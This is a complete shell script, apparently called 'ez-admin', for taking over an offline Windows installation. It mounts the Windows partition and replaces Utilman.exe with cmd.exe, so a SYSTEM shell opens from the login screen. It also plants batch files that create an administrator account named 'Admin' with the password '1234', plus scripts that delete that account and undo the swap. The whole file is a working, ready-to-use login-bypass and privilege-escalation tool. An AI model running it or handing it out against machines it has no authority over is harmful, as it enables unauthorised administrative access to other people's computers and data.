#!/bin/sh

clear
echo ""
echo ""
echo ""
echo "                                 d8888      888               d8b          "
echo "                                d88888      888               Y8P          "
echo "                               d88P888      888                            "
echo "      .d88b. 88888888         d88P 888  .d88888 88888b.d88b.  888 88888b.  "
echo "     d8P  Y8b   d88P         d88P  888 d88  888 888  888  88b 888 888  88b "
echo "     88888888  d88P  888888 d88P   888 888  888 888  888  888 888 888  888 "
echo "     Y8b.     d88P         d8888888888 Y88b 888 888  888  888 888 888  888 "
echo "       Y8888 88888888     d88P     888   Y88888 888  888  888 888 888  888 "
echo ""
echo ""
echo "  - Printing partitions. Please enter a partition to mount and run ez-admin on!"
echo ""
echo ""
fdisk -l

# User input for partition
echo ""
echo ""
echo "  > Enter partition [ named: basic data partition, usually: /dev/sda3 ]: "
read partition

# Check if partition exists
if [ ! -b "$partition" ]; then
    echo "Partition does not exist. Exiting..."
    exit 1
fi

# Mount partition
echo ""
echo "  - Mounting partition..."
mkdir -p /mnt
mount -t ntfs-3g $partition /mnt || { echo "Failed to mount partition"; exit 1; }

# Backup and replace Utilman.exe
echo ""
echo "  - Backing up and replacing Utilman.exe..."
cp /mnt/Windows/System32/Utilman.exe /mnt/Windows/System32/Utilman.exe.bak
cp /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe

# Add ez-restore.bat to System32
echo ""
echo "  - Adding ez-restore.bat to System32..."
cat > /mnt/Windows/System32/ez-restore.bat << EOF
@echo off
start cmd.exe /c "timeout 3 & net user Admin /delete & del /f ez-restore.bat & del /f ez-add-user.bat & del /f ez-remove-user.bat & copy Utilman.exe.bak Utilman.exe /y & echo Finished restoring Utilman.exe and deleted scripts! & timeout 5" & exit
EOF

# Add ez-add-user.bat to System32
echo ""
echo "  - Adding ez-add-user.bat to System32..."
cat > /mnt/Windows/System32/ez-add-user.bat << EOF
@echo off
net user Admin 1234 /add
net localgroup administrators Admin /add
echo Finished creating Admin user!
EOF

# Add ez-remove-user.bat to System32
echo ""
echo "  - Adding ez-remove-user.bat to System32..."
cat > /mnt/Windows/System32/ez-remove-user.bat << EOF
@echo off
net user Admin /delete
echo Finished removing Admin user!
EOF

# Unmount partition
echo ""
echo "  - Unmounting partition..."
umount $partition || { echo "Failed to unmount partition"; exit 1; }

# Done message
echo ""
echo "  - Done!"
echo ""